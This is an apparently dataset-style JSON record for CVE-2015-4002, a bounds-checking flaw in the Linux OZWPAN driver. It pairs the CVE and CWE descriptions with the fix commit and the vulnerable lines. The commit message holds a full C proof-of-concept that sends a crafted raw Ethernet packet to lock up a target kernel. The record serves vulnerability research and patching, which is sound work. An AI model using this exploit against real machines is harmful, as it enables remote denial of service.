{
    "cve_id": "CVE-2015-4002",
    "cve_description": "drivers/staging/ozwpan/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 does not ensure that certain length values are sufficiently large, which allows remote attackers to cause a denial of service (system crash or large loop) or possibly execute arbitrary code via a crafted packet, related to the (1) oz_usb_rx and (2) oz_usb_handle_ep_data functions.",
    "cve_publish_date": "2015-06-07",
    "cwe_id": "CWE-119",
    "cwe_name": "Improper Restriction of Operations within the Bounds of a Memory Buffer",
    "cwe_description": "The product performs operations on a memory buffer, but it reads from or writes to a memory location outside the buffer's intended boundary. This may result in read or write operations on unexpected memory locations that could be linked to other variables, data structures, or internal program data.",
    "commit_message": "ozwpan: unchecked signed subtraction leads to DoS\n\nThe subtraction here was using a signed integer and did not have any\nbounds checking at all. This commit adds proper bounds checking, made\neasy by use of an unsigned integer. This way, a single packet won't be\nable to remotely trigger a massive loop, locking up the system for a\nconsiderable amount of time. A PoC follows below, which requires\nozprotocol.h from this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>\n #include <linux/if_packet.h>\n #include <net/if.h>\n #include <netinet/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys/ioctl.h>\n #include <sys/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t\tstruct oz_elt oz_elt2;\n\t\tstruct oz_multiple_fixed oz_multiple_fixed;\n\t} __packed packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 0,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t},\n\t\t.oz_elt2 = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_multiple_fixed) - 3\n\t\t},\n\t\t.oz_multiple_fixed = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_USB_ENDPOINT_DATA,\n\t\t\t.endpoint = 0,\n\t\t\t.format = OZ_DATA_F_MULTIPLE_FIXED,\n\t\t\t.unit_size = 1,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "type_of_change": "Modification",
    "filename_of_changes": "ozusbsvc1.c",
    "code_language": "C",
    "number_of_lines_added_for_mitigation": "4",
    "number_of_lines_deleted_vulnerable_to_cve": "3",
    "vulnerable_lines": [
        "// Line_Reference 329: \t\t\tint n;",
        "// Line_Reference 330: \t\t\tif (!body->unit_size)",
        "// Line_Reference 332: \t\t\tn = (len - sizeof(struct oz_multiple_fixed)+1)"
    ]
}
